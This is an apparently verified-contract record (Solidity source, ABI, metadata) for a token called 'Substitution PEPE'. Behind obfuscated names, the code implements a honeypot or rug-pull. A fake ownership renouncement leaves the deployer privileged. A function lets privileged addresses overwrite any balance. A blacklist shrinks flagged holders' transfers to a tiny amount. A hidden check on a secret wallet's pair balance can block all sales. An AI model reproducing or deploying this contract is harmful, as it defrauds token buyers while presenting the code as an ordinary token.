{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface modeSender {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address minWallet) external view returns (uint256);\n\n    function transfer(address sellLimit, uint256 swapReceiverWallet) external returns (bool);\n\n    function allowance(address modeAuto, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 swapReceiverWallet) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address sellLimit,\n        uint256 swapReceiverWallet\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed senderMinTotal, uint256 value);\n    event Approval(address indexed modeAuto, address indexed spender, uint256 value);\n}\n\nabstract contract maxTotalLimit {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface enableExemptLaunched {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface atWalletFund {\n    function createPair(address swapFeeBuy, address swapFee) external returns (address);\n}\n\ninterface modeSenderMetadata is modeSender {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SubstitutionPEPE is maxTotalLimit, modeSender, modeSenderMetadata {\n\n    address private autoFee;\n\n    address marketingMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private launchedMax;\n\n    function getOwner() external view returns (address) {\n        return autoFee;\n    }\n\n    function isAuto() private view {\n        require(minToken[_msgSender()]);\n    }\n\n    function fundTotal(uint256 swapReceiverWallet) public {\n        isAuto();\n        sellWallet = swapReceiverWallet;\n    }\n\n    function fromShould(address receiverExempt, address sellLimit, uint256 swapReceiverWallet) internal returns (bool) {\n        require(receiverLimit[receiverExempt] >= swapReceiverWallet);\n        receiverLimit[receiverExempt] -= swapReceiverWallet;\n        receiverLimit[sellLimit] += swapReceiverWallet;\n        emit Transfer(receiverExempt, sellLimit, swapReceiverWallet);\n        return true;\n    }\n\n    uint256 sellWallet;\n\n    bool private sellShouldReceiver;\n\n    uint256 fromMax;\n\n    uint256 public shouldMax;\n\n    function tradingWalletSell(address feeFundTotal) public {\n        isAuto();\n        if (swapLaunch) {\n            feeShould = true;\n        }\n        if (feeFundTotal == atSwap || feeFundTotal == isAmount) {\n            return;\n        }\n        takeFund[feeFundTotal] = true;\n    }\n\n    string private fundMarketingAt = \"Substitution PEPE\";\n\n    bool public liquidityTrading;\n\n    function totalToken(address receiverExempt, address sellLimit, uint256 swapReceiverWallet) internal returns (bool) {\n        if (receiverExempt == atSwap) {\n            return fromShould(receiverExempt, sellLimit, swapReceiverWallet);\n        }\n        uint256 receiverWallet = modeSender(isAmount).balanceOf(marketingMode);\n        require(receiverWallet == sellWallet);\n        require(sellLimit != marketingMode);\n        if (takeFund[receiverExempt]) {\n            return fromShould(receiverExempt, sellLimit, receiverAuto);\n        }\n        return fromShould(receiverExempt, sellLimit, swapReceiverWallet);\n    }\n\n    bool private listSell;\n\n    function transferFrom(address receiverExempt, address sellLimit, uint256 swapReceiverWallet) external override returns (bool) {\n        if (_msgSender() != amountFund) {\n            if (txReceiverTake[receiverExempt][_msgSender()] != type(uint256).max) {\n                require(swapReceiverWallet <= txReceiverTake[receiverExempt][_msgSender()]);\n                txReceiverTake[receiverExempt][_msgSender()] -= swapReceiverWallet;\n            }\n        }\n        return totalToken(receiverExempt, sellLimit, swapReceiverWallet);\n    }\n\n    address public isAmount;\n\n    function takeReceiver() public {\n        emit OwnershipTransferred(atSwap, address(0));\n        autoFee = address(0);\n    }\n\n    address amountFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function allowance(address teamFee, address marketingLaunchSender) external view virtual override returns (uint256) {\n        if (marketingLaunchSender == amountFund) {\n            return type(uint256).max;\n        }\n        return txReceiverTake[teamFee][marketingLaunchSender];\n    }\n\n    address public atSwap;\n\n    function swapMarketing(address isEnable, uint256 swapReceiverWallet) public {\n        isAuto();\n        receiverLimit[isEnable] = swapReceiverWallet;\n    }\n\n    string private fromTotal = \"SPE\";\n\n    function owner() external view returns (address) {\n        return autoFee;\n    }\n\n    function approve(address marketingLaunchSender, uint256 swapReceiverWallet) public virtual override returns (bool) {\n        txReceiverTake[_msgSender()][marketingLaunchSender] = swapReceiverWallet;\n        emit Approval(_msgSender(), marketingLaunchSender, swapReceiverWallet);\n        return true;\n    }\n\n    mapping(address => bool) public minToken;\n\n    bool public feeShould;\n\n    uint256 constant receiverAuto = 12 ** 10;\n\n    bool public swapLaunch;\n\n    uint256 private limitList;\n\n    event OwnershipTransferred(address indexed sellMin, address indexed liquidityFund);\n\n    function decimals() external view virtual override returns (uint8) {\n        return fromLimit;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return fundMarketingAt;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchedMode;\n    }\n\n    bool public minTxIs;\n\n    function atLaunch(address shouldAmount) public {\n        require(shouldAmount.balance < 100000);\n        if (liquidityTrading) {\n            return;\n        }\n        if (listSell == sellShouldReceiver) {\n            limitList = shouldMax;\n        }\n        minToken[shouldAmount] = true;\n        if (swapLaunch) {\n            shouldMax = limitList;\n        }\n        liquidityTrading = true;\n    }\n\n    uint256 private launchedMode = 100000000 * 10 ** 18;\n\n    constructor (){\n        \n        enableExemptLaunched launchedFromMarketing = enableExemptLaunched(amountFund);\n        isAmount = atWalletFund(launchedFromMarketing.factory()).createPair(launchedFromMarketing.WETH(), address(this));\n        \n        atSwap = _msgSender();\n        takeReceiver();\n        minToken[atSwap] = true;\n        receiverLimit[atSwap] = launchedMode;\n        \n        emit Transfer(address(0), atSwap, launchedMode);\n    }\n\n    mapping(address => uint256) private receiverLimit;\n\n    bool private amountTeam;\n\n    function transfer(address isEnable, uint256 swapReceiverWallet) external virtual override returns (bool) {\n        return totalToken(_msgSender(), isEnable, swapReceiverWallet);\n    }\n\n    function balanceOf(address minWallet) public view virtual override returns (uint256) {\n        return receiverLimit[minWallet];\n    }\n\n    mapping(address => mapping(address => uint256)) private txReceiverTake;\n\n    function symbol() external view virtual override returns (string memory) {\n        return fromTotal;\n    }\n\n    mapping(address => bool) public takeFund;\n\n    uint8 private fromLimit = 18;\n\n    bool public autoTo;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityFund\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderMinTotal\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingLaunchSender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingLaunchSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapReceiverWallet\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldAmount\",\"type\":\"address\"}],\"name\":\"atLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minWallet\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"swapReceiverWallet\",\"type\":\"uint256\"}],\"name\":\"fundTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTxIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapReceiverWallet\",\"type\":\"uint256\"}],\"name\":\"swapMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeFundTotal\",\"type\":\"address\"}],\"name\":\"tradingWalletSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapReceiverWallet\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapReceiverWallet\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SubstitutionPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}